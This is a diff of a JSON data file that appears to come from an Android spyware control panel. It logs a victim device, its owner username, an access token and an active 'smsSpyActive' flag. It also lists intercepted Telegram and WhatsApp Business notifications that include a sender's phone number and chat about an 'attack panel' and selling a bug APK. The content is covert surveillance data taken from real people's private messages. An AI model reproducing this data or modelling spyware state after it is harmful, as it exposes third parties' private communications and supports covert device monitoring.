@@ -303,7 +303,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775637086814,
+    "lastSeen": 1775637089567,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -319,6 +319,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: Gok",
+        "content": "Cara pakai attack panel gimana",
+        "time": "08/04 15:31",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637091510
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "13 new messages from 12 chats",
+        "time": "08/04 15:31",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637091295
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎5 pesan dari 2 chat",
+        "time": "08/04 15:31",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775637087461
+      },
       {
         "appName": "WA Business",
         "sender": "+62 898-7564-441",
@@ -4294,30 +4318,6 @@
         "time": "08/04 14:40",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775634004235
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
-        "content": "Voice message",
-        "time": "08/04 14:40",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775634004204
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ALL BUYYER GOJO HARIAN: Alifzx rezz",
-        "content": "Sini belik apk bug gue",
-        "time": "08/04 14:40",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775634004166
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "14 new messages from 13 chats",
-        "time": "08/04 14:40",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775634004029
       }
     ],
     "galleryPhotos": [],
